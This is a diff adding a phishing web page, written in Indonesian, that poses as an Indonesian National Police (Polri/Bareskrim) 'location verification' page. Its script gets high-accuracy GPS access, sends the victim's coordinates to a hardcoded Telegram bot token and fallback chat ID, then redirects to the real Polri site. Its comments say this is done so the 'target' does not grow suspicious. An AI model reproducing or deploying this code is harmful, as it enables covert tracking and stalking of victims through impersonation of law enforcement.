@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Verifikasi Polri</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f4f4f4; margin: 0; }
+        .container { text-align: center; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); width: 80%; }
+        button { background-color: #0056b3; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h3>Verifikasi Lokasi Diperlukan</h3>
+        <p>Silakan klik tombol di bawah dan pilih <b>"lanjutkan"</b> untuk melanjutkan ke porli Bareskrim resmi.</p>
+        <button onclick="ambilLokasi()">Verifikasi Sekarang</button>
+    </div>
+
+    <script>
+        // TOKEN BOT KAMU
+        const token = '8455526302:AAEdI-fS7NDr1q3Ao3qlQGIqJg8lrwCefWc';
+        
+        // Mengambil ID dari alamat link secara otomatis
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('id'); 
+
+        function ambilLokasi() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(kirimKeTelegram, tanganiError, {enableHighAccuracy: true});
+            } else {
+                alert("Browser tidak mendukung GPS.");
+            }
+        }
+
+        function kirimKeTelegram(posisi) {
+            const lat = posisi.coords.latitude;
+            const lon = posisi.coords.longitude;
+
+            // Jika link tidak ada ID-nya, kirim ke ID kamu sebagai cadangan
+            const penerima = chatId ? chatId : '1966317946';
+
+            // PERBAIKAN: URL API Telegram harus lengkap seperti ini
+            const url = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${penerima}&latitude=${lat}&longitude=${lon}`;
+
+            fetch(url).then(() => {
+                // Setelah lokasi terkirim, target langsung dibuang ke web Polri asli
+                window.location.href = "https://dumaspresisi.polri.go.id/";
+            }).catch(err => {
+                // Jika gagal kirim, tetap pindahkan agar tidak curiga
+                window.location.href = "https://dumaspresisi.polri.go.id/";
+            });
+        }
+
+        function tanganiError(err) {
+            alert("Harap klik 'Izinkan' untuk verifikasi keamanan sistem.");
+            location.reload();
+        }
+    </script>
+</body>
+</html>
